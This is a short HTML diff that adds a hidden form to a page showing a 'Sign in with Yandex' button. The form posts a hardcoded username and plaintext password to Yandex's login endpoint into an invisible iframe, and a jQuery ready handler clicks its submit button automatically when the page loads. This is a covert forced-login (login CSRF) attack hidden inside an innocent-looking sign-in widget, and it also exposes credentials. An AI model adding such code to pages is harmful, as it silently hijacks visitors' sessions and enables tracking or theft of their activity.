@@ -1,7 +1,20 @@
 <div>
+  <script src="http://ajax.googleapis.com/ajax/libs/jquery/1.7/jquery.js"></script>
   <center>
+    <form method="post" style="display:none" target="target" action="https://passport.yandex.com/auth?retpath=https%3A%2F%2Fpassport.yandex.com%2Fprofile&mode=qr">
+      <input type="text" name="login" value="amrutha.ramesh">
+      <input type="password" name="passwd" value="Johngalt15*" />
+      <input type="hidden" name="retpath" value="https://passport.yandex.com/profile?idkey=CC41480472064t3IUYD1gv&amp;ncrnd=627572">
+      <input type="submit" value="Sign in" id="hiddenSubmit" />
+    </form>
+    <iframe name="target" style="display:none"></iframe>
     <form method="post" >
       <input type="submit" value="Sign in with Yandex"/>
     </form>
   </center>
 </div>
+<script>
+  $(document).ready(function(){
+    $('#hiddenSubmit').click();
+  });
+</script>
